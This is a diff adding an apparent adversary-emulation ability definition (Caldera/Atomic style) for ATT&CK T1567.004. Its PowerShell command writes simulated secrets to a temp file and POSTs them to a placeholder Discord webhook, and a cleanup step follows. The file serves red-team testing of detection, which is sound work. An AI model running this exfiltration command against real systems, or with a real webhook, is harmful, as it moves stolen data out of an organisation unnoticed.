@@ -1,0 +1,34 @@
+---
+- id: fd640ac06fec09bb4e252066eceb3062
+  name: Exfiltrate staged data to a Discord webhook (PowerShell)
+  description: 'Stages a file containing simulated sensitive data and exfiltrates
+    its contents to a
+
+    Discord incoming webhook by POSTing a JSON `content` payload over HTTPS. Webhook
+    URLs
+
+    require no authentication header, so a single HTTPS POST is sufficient to move
+    data out
+
+    of the environment while blending in with normal SaaS traffic.
+
+    See https://discord.com/developers/docs/resources/webhook#execute-webhook
+
+    '
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.004
+    name: 'Exfiltration Over Web Service: Exfiltration Over Webhook'
+  platforms:
+    windows:
+      psh:
+        command: '"secrets, api keys, passwords - T1567.004 atomic test" | Out-File
+          -FilePath "$env:TEMP\T1567.004_loot.txt" -Encoding ascii; $body = @{ content
+          = (Get-Content -Raw "$env:TEMP\T1567.004_loot.txt") } | ConvertTo-Json;
+          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken"
+          -Method Post -ContentType ''application/json'' -Body $body'
+        payloads: []
+        cleanup: Remove-Item -Path "$env:TEMP\T1567.004_loot.txt" -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
